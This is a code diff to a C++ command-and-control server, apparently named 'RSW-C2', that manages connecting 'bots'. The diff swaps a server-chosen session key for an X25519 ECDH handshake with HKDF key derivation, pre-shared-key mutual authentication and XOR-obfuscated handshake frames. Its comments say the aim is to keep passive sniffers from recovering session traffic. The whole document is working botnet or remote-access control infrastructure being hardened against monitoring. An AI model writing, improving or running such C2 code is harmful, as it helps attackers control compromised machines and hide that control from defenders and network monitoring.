@@ -15,6 +15,7 @@
 #include <memory>   // shared_ptr — per-thread done-flag (shutdown UAF fix)
 #include "crypto.h"   // ChaCha20-Poly1305 AEAD for transport encryption
 #include "rsw_protocol.h"  // SPLIT: stateless parse/transport layer (rsw::)
+#include "keyexchange.h"   // ECDH handshake: X25519 + HKDF + mutual auth PSK
 
 #define CHUNK_SIZE 32768  // 32 KB chunks
 
@@ -911,12 +912,38 @@ public:
     /*
      * BACKGROUND THREAD: per-bot response listener.
      *
-     * Flow (raw TCP, no TLS):
-     *   1. Receive identification (BOT_CONNECT:)
-     *   2. Send session key (SESSION_KEY:)
-     *   3. Main recv loop
+     * Flow (raw TCP, no TLS) — ECDH handshake, 4 messages:
+     *   1. Bot → Srv: BOT_CONNECT:<id>            (XOR 0x55)
+     *   2. Srv → Bot: SESSION_PUB:<srv_eph_pub>    (XOR 0x5A, wrapped)
+     *   3. Bot → Srv: CLIENT_PUB:<bot_eph_pub><confirm_mac>  (XOR 0x55, wrapped)
+     *   4. Srv → Bot: AUTH_OK:<auth_mac>           (XOR 0x5A, wrapped)
+     *
+     * Session key = HKDF(X25519(eph,eph), transcript incl. bot_id) on both
+     * sides — the key itself never crosses the wire (PFS). confirm/auth MACs
+     * prove both sides know the PSK (loadPsk()); empty PSK → ECDH-only mode,
+     * logged as a warning (encryption without identity binding).
      */
     void botResponseListener(ClientInfo client) {
+        // Helper: mark this client unauthenticated + close its socket.
+        // Used on every handshake failure path (handshake happens BEFORE the
+        // main recv loop, so its failure path must clear the flag that STEP 1
+        // already set under the lock).
+        auto handshakeFail = [&](const string& reason) {
+            cout << "\033[1;31m[-] Handshake failed from " << client.ip
+                 << ":" << client.port << " — " << reason << "\033[0m" << endl;
+            {
+                std::lock_guard<std::mutex> lock(clients_mutex_);
+                for (auto& c : connected_clients) {
+                    if (c.socket == client.socket) c.authenticated = false;
+                }
+            }
+            #ifdef _WIN32
+                closesocket(client.socket);
+            #else
+                close(client.socket);
+            #endif
+        };
+
         // ============================================================================
         // STEP 1: Receive bot identification (raw TCP recv)
         // ============================================================================
@@ -970,58 +997,158 @@ public:
             }
         }
 
-        // Update auth status in connected_clients vector
+        // ---- Parse + trim bot_id (local string op, no lock needed) ----
+        string raw_bot_id = identification.substr(12);
+        size_t id_end = raw_bot_id.find_last_not_of(" \n\r\t");
+        if (id_end != string::npos) raw_bot_id = raw_bot_id.substr(0, id_end + 1);
+
+        // Small fully-reliable send (handshake frames are < 128 bytes, but a
+        // single send() may still write partially under signal pressure).
+        auto sendRaw = [&](const string& data) -> bool {
+            size_t sent = 0;
+            while (sent < data.length()) {
+                int n = (int)::send(client.socket, data.c_str() + sent,
+                                    (int)(data.length() - sent), 0);
+                if (n <= 0) return false;
+                sent += (size_t)n;
+            }
+            return true;
+        };
+
+        // ============================================================================
+        // STEP 2: ECDH — server ephemeral keypair → SESSION_PUB to the bot.
+        // The session key is DERIVED (HKDF over X25519 shared secret + bot_id
+        // transcript); it never crosses the wire → forward secrecy. The old
+        // protocol sent a server-chosen key directly (XOR-obfuscated only) —
+        // a passive sniffer recording the handshake could decrypt the whole
+        // session after compromise of that one value.
+        // ============================================================================
+        uint8_t srv_priv[32], srv_pub[32];
+        if (x25519Keypair(srv_priv, srv_pub) != 0) {
+            handshakeFail("CSPRNG failure (/dev/urandom)");
+            return;
+        }
+
+        string session_pub_msg = "SESSION_PUB:" + string((char*)srv_pub, 32);
+        string welcome_msg = "RSW-C2: Bot " + raw_bot_id + " connected successfully!\n";
+        string combined = session_pub_msg + welcome_msg;
+        for (size_t _kx = 0; _kx < combined.size(); _kx++) combined[_kx] ^= 0x5A;
+        if (!sendRaw(wrapForTransport(combined))) {
+            memset(srv_priv, 0, sizeof(srv_priv));
+            handshakeFail("failed to send SESSION_PUB");
+            return;
+        }
+
+        // ============================================================================
+        // STEP 3: receive CLIENT_PUB:<bot_eph_pub 32><confirm_mac 32>
+        // Framed accumulation — TCP may split the frame across recv() calls,
+        // so parse the 4-byte BE length header and wait for the full frame.
+        // ============================================================================
+        string hsbuf, hs_leftover;
+        string client_pub_frame;
+        {
+            bool got = false;
+            while (listening) {
+                char b[2048];
+                int n = recv(client.socket, b, sizeof(b), 0);
+                if (n <= 0) {
+                    memset(srv_priv, 0, sizeof(srv_priv));
+                    handshakeFail("connection lost during ECDH (awaiting CLIENT_PUB)");
+                    return;
+                }
+                hsbuf.append(b, n);
+                if (hsbuf.size() >= 5) {
+                    size_t flen = ((unsigned char)hsbuf[0] << 24) |
+                                  ((unsigned char)hsbuf[1] << 16) |
+                                  ((unsigned char)hsbuf[2] << 8) |
+                                  (unsigned char)hsbuf[3];
+                    if (flen > 0x0FFFFFFF) {
+                        memset(srv_priv, 0, sizeof(srv_priv));
+                        handshakeFail("corrupt CLIENT_PUB frame header");
+                        return;
+                    }
+                    if (hsbuf.size() >= 5 + flen) {
+                        client_pub_frame = hsbuf.substr(0, 5 + flen);
+                        hs_leftover = hsbuf.substr(5 + flen);  // preserve any pipelined bytes
+                        got = true;
+                        break;
+                    }
+                }
+            }
+            if (!got) { memset(srv_priv, 0, sizeof(srv_priv)); return; }  // listening went false
+        }
+
+        string cp = unwrapFromTransport(client_pub_frame);
+        if (cp.size() == client_pub_frame.size()) {   // unwrap returns input unchanged on error
+            memset(srv_priv, 0, sizeof(srv_priv));
+            handshakeFail("CLIENT_PUB checksum mismatch");
+            return;
+        }
+        for (auto& ch : cp) ch ^= 0x55;               // bot→server XOR key (matches BOT_CONNECT)
+        if (cp.size() < 11 + 32 + 32 || cp.substr(0, 11) != "CLIENT_PUB:") {
+            memset(srv_priv, 0, sizeof(srv_priv));
+            handshakeFail("malformed CLIENT_PUB payload");
+            return;
+        }
+        const uint8_t* bot_pub  = (const uint8_t*)cp.data() + 11;
+        const uint8_t* cfm_mac  = bot_pub + 32;
+
+        // ---- Mutual auth: prove the bot knows the PSK (constant-time cmp) ----
+        string psk = loadPsk();
+        uint8_t expect_confirm[32];
+        computeConfirmMac(psk, srv_pub, bot_pub, expect_confirm);
+        if (!constantTimeEqual(expect_confirm, cfm_mac, 32)) {
+            memset(srv_priv, 0, sizeof(srv_priv));
+            handshakeFail("PSK confirm MAC mismatch (bot PSK missing or wrong)");
+            return;
+        }
+
+        // ---- Derive the session key (identical call on the bot side) ----
+        uint8_t shared_secret[32], session_key[32];
+        x25519(shared_secret, srv_priv, bot_pub);
+        deriveSessionKey(shared_secret, srv_pub, bot_pub, raw_bot_id, session_key);
+        memset(srv_priv, 0, sizeof(srv_priv));         // wipe ephemeral private key
+        memset(shared_secret, 0, sizeof(shared_secret));
+
+        // ============================================================================
+        // STEP 4: AUTH_OK:<auth_mac 32> — proves the SERVER knows the PSK too.
+        // Sent wrapped+XOR only (bot enables AEAD after verifying it).
+        // ============================================================================
+        uint8_t auth_mac[32];
+        computeAuthMac(psk, srv_pub, bot_pub, raw_bot_id, auth_mac);
+        string auth_msg = "AUTH_OK:" + string((char*)auth_mac, 32);
+        for (auto& ch : auth_msg) ch ^= 0x5A;
+        if (!sendRaw(wrapForTransport(auth_msg))) {
+            memset(session_key, 0, sizeof(session_key));
+            handshakeFail("failed to send AUTH_OK");
+            return;
+        }
+
+        // ---- Handshake complete: publish state under the lock ----
         {
             std::lock_guard<std::mutex> lock(clients_mutex_);
             for (auto& c : connected_clients) {
                 if (c.socket == client.socket) {
-                    // Trim trailing newlines/spaces from bot_id
-                    string raw_bot_id = identification.substr(12);
-                    size_t end = raw_bot_id.find_last_not_of(" \n\r\t");
-                    if (end != string::npos) raw_bot_id = raw_bot_id.substr(0, end + 1);
                     c.bot_id = raw_bot_id;
-                    c.authenticated = true;
-
-                    // Generate session key for this client
-                    random_device rd;
-                    mt19937 gen(rd());
-                    for (int i = 0; i < 32; i++) {
-                        c.session_key[i] = (unsigned char)(rd() ^ (i * 17 + 31));
-                    }
-                    // NOTE: session_encryption is intentionally NOT set yet!
-                    // The first SESSION_KEY message must be sent WITHOUT XOR encryption
-                    // because the client doesn't have the key yet.
-
-                    // Send session key + welcome — raw TCP, WRAPPED ONLY, NO AEAD ENCRYPTION
-                    // (encryptForClient checks session_encryption which is still false).
-                    // The key bytes are XOR-obfuscated with a fixed key so a passive
-                    // sniffer can't trivially read the session key off the wire.
-                    // (Same trust level as the BOT_CONNECT XOR; real PFS would need
-                    // TLS. The client XOR-decodes after unwrap.)
-                    string key_exchange = "SESSION_KEY:" + string((char*)c.session_key, 32);
-                    string welcome_msg = "RSW-C2: Bot " + c.bot_id + " connected successfully!\n";
-                    string combined = key_exchange + welcome_msg;
-                    for (size_t _kx = 0; _kx < combined.size(); _kx++) combined[_kx] ^= 0x5A;
-                    string wrapped = wrapForTransport(combined);
-                    send(c.socket, wrapped.c_str(), wrapped.length(), 0);
-
-                    // NOW enable session encryption for all subsequent messages
+                    c.authenticated = true;            // only NOW — full handshake done
+                    memcpy(c.session_key, session_key, 32);
                     c.session_encryption = true;
-                    memcpy(client.session_key, c.session_key, 32);
-                    client.session_encryption = true;
-
-                    cout << "\033[1;32m[+] Bot authenticated: " << c.bot_id
-                         << " (" << c.ip << ":" << c.port << ") [encrypted]\033[0m" << endl;
-
-                    // IMPORTANT: Update the local parameter copy's encryption state so the
-                    // recv loop below can decrypt properly (botResponseListener takes client BY VALUE)
-                    client.bot_id = c.bot_id;  // Also sync bot_id so disconnect message shows correct ID
-                    memcpy(client.session_key, c.session_key, 32);
-                    client.session_encryption = true;
-
                     break;
                 }
             }
+        }
+        // Local copies for the recv loop (botResponseListener takes client BY VALUE)
+        client.bot_id = raw_bot_id;
+        memcpy(client.session_key, session_key, 32);
+        client.session_encryption = true;
+        memset(session_key, 0, sizeof(session_key));   // class copy keeps the only copy
+
+        cout << "\033[1;32m[+] Bot authenticated: " << client.bot_id
+             << " (" << client.ip << ":" << client.port << ") [ECDH"
+             << (psk.empty() ? " no-PSK" : "+PSK") << "]\033[0m" << endl;
+        if (psk.empty()) {
+            cout << "\033[1;33m[!] No PSK configured (RSW_PSK env / psk.txt) — "
+                 << "session is encrypted but NOT mutually authenticated\033[0m" << endl;
         }
 
         // ============================================================================
@@ -1032,7 +1159,7 @@ public:
         // 4-byte BE length (see sendEncryptedCommand). We buffer incoming bytes
         // and only decrypt/unwrap COMPLETE frames, so partial data can never
         // desync the stream or be misparsed as a command response.
-        string stream_buffer;
+        string stream_buffer = hs_leftover;   // any bytes past the CLIENT_PUB frame
         while (listening) {
             char recv_buffer[8192];
             int n = recv(client.socket, recv_buffer, sizeof(recv_buffer), 0);
